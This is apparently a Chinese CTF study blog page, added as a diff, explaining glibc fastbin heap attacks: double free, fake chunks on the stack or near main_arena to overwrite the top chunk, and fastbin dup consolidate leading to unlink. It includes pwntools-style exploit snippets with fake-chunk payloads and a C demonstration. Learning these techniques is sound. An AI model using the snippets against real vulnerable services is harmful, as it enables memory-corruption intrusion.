@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="1.Fastbin Double FreeDouble free及将一个堆块free两次，gdb中如下图所示  这样我们就可以将两个堆块申请在同一个位置，其中一个堆块是free状态，我们可以通过另一个堆块对fd指针进行修改 Fastbin Double Free能够成功利用的原因： 1.fastbin的堆块被释放后next_chunk的prev_inuse位不会被清空 2.fastbin在执行f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastbin attack">
+<meta property="og:url" content="http://example.com/2025/11/18/fastbin-attack/index.html">
+<meta property="og:site_name" content="小小pwn">
+<meta property="og:description" content="1.Fastbin Double FreeDouble free及将一个堆块free两次，gdb中如下图所示  这样我们就可以将两个堆块申请在同一个位置，其中一个堆块是free状态，我们可以通过另一个堆块对fd指针进行修改 Fastbin Double Free能够成功利用的原因： 1.fastbin的堆块被释放后next_chunk的prev_inuse位不会被清空 2.fastbin在执行f">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/11/18/fastbin-attack/70284676bc5d1e887cca2f653cfcea8a.png">
+<meta property="og:image" content="http://example.com/2025/11/18/fastbin-attack/image.png">
+<meta property="og:image" content="http://example.com/2025/11/18/fastbin-attack/image-1763396154028-3.png">
+<meta property="og:image" content="http://example.com/2025/11/18/fastbin-attack/imag.png">
+<meta property="article:published_time" content="2025-11-17T16:00:59.000Z">
+<meta property="article:modified_time" content="2025-11-17T16:22:39.544Z">
+<meta property="article:author" content="和方煜">
+<meta property="article:tag" content="知识点">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/11/18/fastbin-attack/70284676bc5d1e887cca2f653cfcea8a.png">
+
+<link rel="canonical" href="http://example.com/2025/11/18/fastbin-attack/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>fastbin attack | 小小pwn</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小小pwn</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/fastbin-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          fastbin attack
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-11-18 00:00:59 / 修改时间：00:22:39" itemprop="dateCreated datePublished" datetime="2025-11-18T00:00:59+08:00">2025-11-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <hr>
+<h1 id="1-Fastbin-Double-Free"><a href="#1-Fastbin-Double-Free" class="headerlink" title="1.Fastbin Double Free"></a>1.Fastbin Double Free</h1><p>Double free及将一个堆块free两次，gdb中如下图所示</p>
+<p><img src="/2025/11/18/fastbin-attack/70284676bc5d1e887cca2f653cfcea8a.png" alt="70284676bc5d1e887cca2f653cfcea8a"></p>
+<p>这样我们就可以将两个堆块申请在同一个位置，其中一个堆块是free状态，我们可以通过另一个堆块对fd指针进行修改</p>
+<p><strong>Fastbin Double Free能够成功利用的原因：</strong></p>
+<p>1.fastbin的堆块被释放后next_chunk的prev_inuse位不会被清空</p>
+<p>2.fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。对于链表后面的块并没有进行验证</p>
+<h1 id="2-fastbin-dump-into-stack"><a href="#2-fastbin-dump-into-stack" class="headerlink" title="2.fastbin dump into stack"></a>2.fastbin dump into stack</h1><p>顾名思义，将堆块申请在栈上，控制栈上的数据，利用uaf漏洞，将fd指针改为要控制数据的地址-0x10（因为fd指针指的是堆块的头部，所以需要-0x10，才刚好使数据段落在要要控制数据的栈上），修改堆块的内容就可以控制栈上的数据</p>
+<p>注：首先要伪造size位（0xn1）</p>
+<p>ISMMAP位不能为1</p>
+<p>inues位为0</p>
+<p>size位为0x40</p>
+<p>地址要64位：0&#x2F;8</p>
+<p>​          32位：0&#x2F;4  对齐</p>
+<p>在内存中构造了一个了一个堆块，还要怎么样才能让它   free</p>
+<p>扩展用在fastbin attack打mallco使申请堆块大小受限制（&lt;&#x3D;0x60,也就是没发使堆块的size位为0x71）</p>
+<p>在2.23和2.27的libc版本中，由于没有对top chunk的size合法性进行检查，所以我们把top_chunk的地址改了，就能申请任意地址</p>
+<p>直接改top chunk的地址</p>
+<p>申请一个size位为0x31的堆块，free掉，修改fd指针为0x61，再将这个堆块申请出来，这样main_arena中存储大小为0x30的堆块的数组就会存上0x61（为了伪造size位）</p>
+<p><img src="/2025/11/18/fastbin-attack/image.png" alt="image"></p>
+<p>然后我们申请一个size位为0x61的堆块，free掉，修改指针到main_arena-80的地方这样，申请两次，将main_arena-80的堆块申请出来，因为main_arena-80与top chunk的地址紧挨着，所以可以写数据覆盖top chunk</p>
+<p>为什么要是main_arena-80看图</p>
+<p><img src="/2025/11/18/fastbin-attack/image-1763396154028-3.png" alt="image"></p>
+<p>这样可以伪造一个size位，堆块才能被申请在这里</p>
+<p><img src="/2025/11/18/fastbin-attack/imag.png" alt="imag"></p>
+<p>具体写多少自己数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x61</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x7ffff7bc4b28</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x50</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = p64(<span class="number">8</span>)*<span class="number">8</span>+p64(<span class="number">0x7ffff7bc4aed</span>)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-fastbin-dup-consolidate"><a href="#3-fastbin-dup-consolidate" class="headerlink" title="3.fastbin dup consolidate"></a>3.fastbin dup consolidate</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">  void* p1 = malloc(<span class="number">0x40</span>);</span><br><span class="line">  void* p2 = malloc(<span class="number">0x40</span>);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Now free p1!\n&quot;</span>);</span><br><span class="line">  free(p1);</span><br><span class="line"></span><br><span class="line">  void* p3 = malloc(<span class="number">0x400</span>);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);</span><br><span class="line">  free(p1);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Trigger the double free vulnerability!\n&quot;</span>);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, malloc(<span class="number">0x40</span>), malloc(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>申请两个堆块大小范围在fastbin，p2是为了防止触发<code>malloc_consolidate</code> 使得p1被合并进入top_chunk</p>
+<p>free掉p1进入fastbin申请0x400的大小的chunk，这时触发<code>malloc_consolidate</code>，p1就会被放在unsortbin</p>
+<p>因为这时候p1已经不在fastbins了，可以再次free一次触发double free</p>
+<p>这时候申请两次</p>
+<p>第一次会把 fastbin 中的 p1 chunk 给 malloc 出来，然后 fastbin 为空</p>
+<p>第二次会把 unsorted 中的 p1 chunk 给 malloc 出来，所以会能 malloc 到两次一样的 chunk</p>
+<p>效果: 首先它会像unsortedbin（small）一样将相邻高地址的堆块inuse位置零同时也会被放进unsortedbin链表中(即存在fd和bk的使用), 其次它依旧满足fastbin的free堆块inuse位不置零, 那么如果存在有off by one或者其写入大小符合在不free时可以写入下一个chunk的pre_size, 那么就很容易触发到unlink了</p>
+<p>具体实现：</p>
+<p>malloc_consolidate的功能就是把chunk从fastbin取出，相邻的chunk进行合并，并且会设置下一个chunk的prev_inuse位为0。当chunk从fastbin里取出后，我们就可以在再一次free这个chunk了，此时，fastbin里没有形成循环链表，一个chunk在fastbin，一个chunk在unosrted bin（small）。关键的一点是下一个chunk的prev_inuse已经清零，我们将fastbin里的那个chunk申请回来，伪造一个chunk（往fastbin中写，也就是写入了unsortbin中，将fd与bk设为对应的值就可以），然后释放下一个unsorted bin范围的chunk，就会发生unlink。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;samll&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;big&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;large&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(small_buf_addr - <span class="number">0x18</span>) + p64(small_buf_addr - <span class="number">0x10</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>触发unlink一定要伪造一个free掉的堆块在指针处，因为unlink比较是和头部比较，而数组中存储的是指针的值，所以要伪造头部在指针处才能绕过保护</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag"># 知识点</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/18/unsortbins/" rel="prev" title="unsortbins">
+      <i class="fa fa-chevron-left"></i> unsortbins
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/18/UAF/" rel="next" title="UAF">
+      UAF <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Fastbin-Double-Free"><span class="nav-number">1.</span> <span class="nav-text">1.Fastbin Double Free</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-fastbin-dump-into-stack"><span class="nav-number">2.</span> <span class="nav-text">2.fastbin dump into stack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-fastbin-dup-consolidate"><span class="nav-number">2.1.</span> <span class="nav-text">3.fastbin dup consolidate</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">和方煜</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">和方煜</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">72k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:05</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+// 在最后添加
+<script src="/js/code-unfold.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
